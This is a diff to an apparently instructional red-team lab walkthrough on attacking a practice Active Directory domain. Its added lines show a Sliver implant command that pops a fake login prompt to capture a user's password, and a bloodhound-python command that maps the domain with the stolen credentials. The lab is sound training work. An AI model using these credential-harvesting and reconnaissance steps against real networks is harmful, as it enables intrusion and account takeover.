@@ -316,24 +316,33 @@ This is the application for Mice Control that was mentioned in one of the notes 
 
 ## Attacking the Active Directory Infrastructure
 
-Most enterprises today rely on Microsoft Active Directory, .... bla bla. For the intruder, compromising the Active Directory would typically allow him total control of the whole IT infrastructure, including applications, OT systems and more. These attacks can be extremely difficult to defend against since the intruder will abuse the way protocols work and are designed, rather than vulnerabilities that can be patched.
+Most enterprises rely on Microsoft Active Directory. For the intruder, compromising the Active Directory would typically allow him total control of the whole IT infrastructure, including applications, OT systems and more. These attacks can be extremely difficult to defend against since the intruder will abuse the way protocols work and are designed, rather than exploiting vulnerabilities that can be patched.
 
 ### Getting Garfield AD Credentials
 
-As a first foothold we need some credentials in the domain cruelcomputing.com. Unfortunately, our sliver session does not run with any interesting privileges so we cannot easily escalate our local privileges on the machine (to SYSTEM privileges) and dump credentials from memory or registry.
+As a first foothold we need some credentials in the Active Directory domain crueltesting.com. There are several methods the attacker could use to get credentials from a domain user.
 
-But, we can ask politely.
+One of them is to ask politely.
+
+We have already mentioned that having copied the website of crueltesting we could send a phishing email asking users to logon to what looks like crueltesting website. We could also ask garfield directly:
 
 In our sliver session tab, type
 
+```
 c2tc-askcreds for "garfield@crueltesting.com"
-
+```
+![Asking for credentials via sliver implant](assets/sliver-prompt-password.png)
 Now go back to your tab for the RDP session to client1 cruelcomputing. You will see that a window has opened asking garfield for his credentials.
 
 Type something in that window simulating garfield falling for the trap (garfields password is catsRCute2026!)
 
+![Garfield enters the password](assets/users-enters-password.png)
+
 Back in your sliver session window you will see what garfield typed.
 
+![Sliver sees password](assets/sliver-sees-password.png)
+
+Joy! We now hopefully a domain password and can proceed with mapping the Active Directory with Bloodhound.
 ### Recon of AD with Bloodhound
 
 The active directory stores information about every user and service in the active directory domain. Users and services are typically assigned to groups, to which privileges can be assigned. The most privileged groups are Enterprise Admins and Domain Admins.
@@ -341,21 +350,25 @@ The ultimate target of the intruder is to compromise one of the most privileged 
 
 Armed with the username and password of garfield we cannow learn about the target active directory. Note that we the intruder can do the mapping even though our victim (garfield) is just a regular user. This is because the directory allows plenty of read access to all their users.
 
-We will use a populare tool - bloodhound - for our recon. In a command shell window type
+We will use a popular tool - bloodhound - for our recon. In a command shell window type
+(note that we learned about the garfield credentials and the name of the domain controller dc01.crueltesting.com above)
 
+```
 proxychains4 bloodhound-python -u 'garfield' -p 'catsRCute2026!' -d 'crueltesting.com' -dc dc01.crueltesting.com -gc dc01.crueltesting.com -ns 10.0.2.10 --dns-tcp -c All --zip
+```
 
 This will use our relay function to contact the Active Directory Domain Controller to extract information.
 As a result a zip file is created on our evil machine.
 
 Next start the bloodhound server on our evil machine, in order to examine the results via a GUI.
 From a command shell window type
-
+```
 docker compose -f /home/localadmin/tools/bloodhound/docker-compose.yml up -d
+```
 
-You cannow open bloodhound to investigate the active directory domain, and potential ways of elevating our current measly privileges.
+You cannow open bloodhound to investigate the active directory domain, and potential ways of elevating our privileges - the ultimate objective is to become a domain admin.
 
-(explanation of bloodhound GUI, searching for paths etc , will fill in later)
+
 
 ### Kerberoasting
 
